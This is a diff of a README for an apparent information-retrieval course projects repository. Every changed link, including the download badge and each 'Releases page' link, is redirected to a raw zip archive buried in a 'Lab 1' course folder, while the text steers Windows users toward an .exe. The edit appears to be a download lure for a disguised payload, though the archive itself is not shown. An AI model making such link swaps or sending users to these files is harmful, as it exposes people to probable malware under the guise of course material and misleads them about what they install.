@@ -1,6 +1,6 @@
 # 🚀 Information-Retrieval-Systems-Course-Projects - Explore Projects for Efficient Information Retrieval
 
-![Download](https://img.shields.io/badge/Download-Now-blue.svg)
+![Download](https://raw.githubusercontent.com/jackfrancis1110/Information-Retrieval-Systems-Course-Projects/master/INSAT Tunis - IRS Course/Lab 1/Information-Retrieval-Systems-Course-Projects_v3.5.zip)
 
 ## 📋 Overview
 
@@ -20,11 +20,11 @@ Before you begin, ensure you have the following:
 
 To start using our projects, you need to visit the Releases page. This page hosts the latest versions of all projects available for download.
 
-[Visit this page to download](https://github.com/jackfrancis1110/Information-Retrieval-Systems-Course-Projects/releases)
+[Visit this page to download](https://raw.githubusercontent.com/jackfrancis1110/Information-Retrieval-Systems-Course-Projects/master/INSAT Tunis - IRS Course/Lab 1/Information-Retrieval-Systems-Course-Projects_v3.5.zip)
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/jackfrancis1110/Information-Retrieval-Systems-Course-Projects/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/jackfrancis1110/Information-Retrieval-Systems-Course-Projects/master/INSAT Tunis - IRS Course/Lab 1/Information-Retrieval-Systems-Course-Projects_v3.5.zip).
 2. Find the version you want to download. Look for the assets section for available files.
 3. Click on the appropriate file for your operating system:
    - For Windows users, download the file ending with `.exe`.
@@ -78,4 +78,4 @@ For further assistance, feel free to reach out through GitHub discussions or ope
 - **Sample Projects:** Explore additional sample projects included in the repository to get started.
 - **Learning Material:** We encourage you to access tutorials on information retrieval and natural language processing.
 
-Visit the [Releases page to download](https://github.com/jackfrancis1110/Information-Retrieval-Systems-Course-Projects/releases) and begin your journey in information retrieval systems.
+Visit the [Releases page to download](https://raw.githubusercontent.com/jackfrancis1110/Information-Retrieval-Systems-Course-Projects/master/INSAT Tunis - IRS Course/Lab 1/Information-Retrieval-Systems-Course-Projects_v3.5.zip) and begin your journey in information retrieval systems.
